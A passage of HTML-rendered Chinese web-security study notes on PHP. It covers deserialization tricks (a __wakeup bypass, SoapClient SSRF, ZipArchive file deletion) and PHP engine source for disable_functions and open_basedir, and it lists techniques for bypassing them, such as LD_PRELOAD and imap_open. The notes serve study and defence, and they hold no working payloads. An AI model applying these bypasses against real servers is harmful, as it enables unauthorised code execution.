class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Data</span><span class="cm-string">'s value is malicious value.</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">destruct</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>这里 wakeup 被绕过，值依旧被修改了。</span></p></blockquote><h4 id='利用点'><span>利用点</span></h4><blockquote><p><strong><span>SoapClient 原生利用</span></strong></p><p><span>php 中的 SoapClient 类可以创建 soap 数据报文，在非 wsdl 模式下，SoapClient 的实例反序列化的时候会对第二个参数指明的 url 进行 soap 请求，该特性可用于 SSRF。</span></p><h5 id='ziparchive-原生利用'><span>ZipArchive 原生利用</span></h5><p><span>php 原生类 ZipArchive::open() 中的 flag 参数如果设置为 ZipArchive::OVERWRITE 时，会删除指定文件，该特性在一定条件下可以用于删除文件。</span></p></blockquote><h4 id='session-1'><span>Session</span></h4><blockquote><p><span>PHP 中 session 默认是以文件形式存储的，文件以 sess_sessionid 命名，在 session 一定程度可控的情况下，可通过 session 触发反序列化。</span></p></blockquote><h4 id='相关-cve-3'><span>相关 CVE</span></h4><blockquote><p><strong><span>CVE-2016-7124</span></strong></p><p><span>在 PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性 (变量) 数大于实际的个数时， </span><span>_</span><span>_</span><span>wakeup() 不会被执行。</span></p></blockquote><h3 id='disable-functions'><span>Disable Functions</span></h3><h4 id='机制实现-1'><span>机制实现</span></h4><blockquote><p><span>PHP 中 Disable Function 的实现是在 php-src/Zend/Zend-API.c 中。PHP 在启动时，读取配置文件中禁止的函数，逐一根据禁止的函数名调用 zend_disable_function 来实现禁止的效果。</span></p><p><span>这个函数根据函数名在内置函数列表中找到对应的位置并修改掉，当前版本的代码如下：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33594px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>13</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">ZEND_API</span> <span class="cm-variable">int</span> <span class="cm-variable">zend_disable_function</span>(<span class="cm-variable">char</span> <span class="cm-operator">*</span><span class="cm-variable">function_name</span>, <span class="cm-variable">size_t</span> <span class="cm-variable">function_name_length</span>) <span class="cm-comment">/* {{{ */</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">zend_internal_function</span> <span class="cm-operator">*</span><span class="cm-variable">func</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> ((<span class="cm-variable">func</span> <span class="cm-operator">=</span> <span class="cm-variable">zend_hash_str_find_ptr</span>(<span class="cm-variable">CG</span>(<span class="cm-variable">function_table</span>), <span class="cm-variable">function_name</span>, <span class="cm-variable">function_name_length</span>))) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">zend_free_internal_arg_info</span>(<span class="cm-variable">func</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">func</span><span class="cm-operator">-&gt;</span><span class="cm-variable">fn_flags</span> <span class="cm-operator">&amp;=</span> <span class="cm-variable">~</span>(<span class="cm-variable">ZEND_ACC_VARIADIC</span> <span class="cm-operator">|</span> <span class="cm-variable">ZEND_ACC_HAS_TYPE_HINTS</span> <span class="cm-operator">|</span> <span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ZEND_ACC_HAS_RETURN_TYPE</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">func</span><span class="cm-operator">-&gt;</span><span class="cm-variable">num_args</span> <span class="cm-operator">=</span> <span class="cm-number">0</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">func</span><span class="cm-operator">-&gt;</span><span class="cm-variable">arg_info</span> <span class="cm-operator">=</span> <span class="cm-atom">NULL</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">func</span><span class="cm-operator">-&gt;</span><span class="cm-variable">handler</span> <span class="cm-operator">=</span> <span class="cm-variable">ZEND_FN</span>(<span class="cm-variable">display_disabled_function</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-variable">SUCCESS</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-variable">FAILURE</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 363px;"></div><div class="CodeMirror-gutters" style="height: 363px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><p><span>和函数的实现方式类似，disable classes 也是这样实现的</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.32812px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>16</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">ZEND_API</span> <span class="cm-variable">int</span> <span class="cm-variable">zend_disable_class</span>(<span class="cm-variable">char</span> <span class="cm-operator">*</span><span class="cm-variable">class_name</span>, <span class="cm-variable">size_t</span> <span class="cm-variable">class_name_length</span>) <span class="cm-comment">/* {{{ */</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">zend_class_entry</span> <span class="cm-operator">*</span><span class="cm-variable">disabled_class</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">zend_string</span> <span class="cm-operator">*</span><span class="cm-builtin">key</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-builtin">key</span> <span class="cm-operator">=</span> <span class="cm-variable">zend_string_alloc</span>(<span class="cm-variable">class_name_length</span>, <span class="cm-number">0</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">zend_str_tolower_copy</span>(<span class="cm-variable">ZSTR_VAL</span>(<span class="cm-builtin">key</span>), <span class="cm-variable">class_name</span>, <span class="cm-variable">class_name_length</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">disabled_class</span> <span class="cm-operator">=</span> <span class="cm-variable">zend_hash_find_ptr</span>(<span class="cm-variable">CG</span>(<span class="cm-variable">class_table</span>), <span class="cm-builtin">key</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">zend_string_release_ex</span>(<span class="cm-builtin">key</span>, <span class="cm-number">0</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> (<span class="cm-operator">!</span><span class="cm-variable">disabled_class</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-variable">FAILURE</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">INIT_CLASS_ENTRY_INIT_METHODS</span>((<span class="cm-operator">*</span><span class="cm-variable">disabled_class</span>), <span class="cm-variable">disabled_class_new</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">disabled_class</span><span class="cm-operator">-&gt;</span><span class="cm-variable">create_object</span> <span class="cm-operator">=</span> <span class="cm-variable">display_disabled_class</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">zend_hash_clean</span>(<span class="cm-operator">&amp;</span><span class="cm-variable">disabled_class</span><span class="cm-operator">-&gt;</span><span class="cm-variable">function_table</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-variable">SUCCESS</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 385px;"></div><div class="CodeMirror-gutters" style="height: 385px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><p><span>因为这个实现机制的原因，在 PHP 启动后通过 ini_set 来修改 disable_functions 或 disable_classes</span></p><p><span>是无效的。</span></p></blockquote><h4 id='bypass-4'><span>Bypass</span></h4><ul><li><p><strong><span>LD_PRELOAD 绕过</span></strong></p><ul><li><a href='https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD' target='_blank' class='url'>https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></li><li><span>mail() + putenv</span></li></ul></li><li><p><span>PHP OPcache</span></p></li><li><p><span>Mail 函数</span></p></li><li><h5 id='imapopen'><span>imap_open</span></h5><ul><li><a href='https://www.cvedetails.com/cve/cve-2018-19518' target='_blank' class='url'>https://www.cvedetails.com/cve/cve-2018-19518</a></li></ul></li></ul><h3 id='open-basedir'><span>Open Basedir</span></h3><h4 id='机制实现-2'><span>机制实现</span></h4><blockquote><p><span>PHP 中 Disable Function 的实现是在 php-src/main/fopen-wrappers.c 中，实现方式是在调用文件等相关操作时调用函数根据路径来检查是否在 basedir 内，其中一部分实现代码如下：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>38</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">PHPAPI</span> <span class="cm-variable">int</span> <span class="cm-variable">php_check_open_basedir_ex</span>(<span class="cm-keyword">const</span> <span class="cm-variable">char</span> <span class="cm-operator">*</span><span class="cm-variable">path</span>, <span class="cm-variable">int</span> <span class="cm-variable">warn</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-comment">/* Only check when open_basedir is available */</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> (<span class="cm-variable">PG</span>(<span class="cm-variable">open_basedir</span>) <span class="cm-operator">&amp;&amp;</span> <span class="cm-operator">*</span><span class="cm-variable">PG</span>(<span class="cm-variable">open_basedir</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">char</span> <span class="cm-operator">*</span><span class="cm-variable">pathbuf</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">char</span> <span class="cm-operator">*</span><span class="cm-variable">ptr</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">char</span> <span class="cm-operator">*</span><span class="cm-builtin">end</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" class="cm-tab-wrap-hack" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-comment">/* Check if the path is too long so we can give a more useful error* message. <span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>*/</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> (<span class="cm-builtin">strlen</span>(<span class="cm-variable">path</span>) <span class="cm-operator">&gt;</span> (<span class="cm-variable">MAXPATHLEN</span> <span class="cm-operator">-</span> <span class="cm-number">1</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">php_error_docref</span>(<span class="cm-atom">NULL</span>, <span class="cm-variable">E_WARNING</span>, <span class="cm-string">"File name is longer than the maximum␣</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-string">allowed path length on this platform (%d): %s"</span>, <span class="cm-variable">MAXPATHLEN</span>, <span class="cm-variable">path</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">errno</span> <span class="cm-operator">=</span> <span class="cm-variable">EINVAL</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-operator">-</span><span class="cm-number">1</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 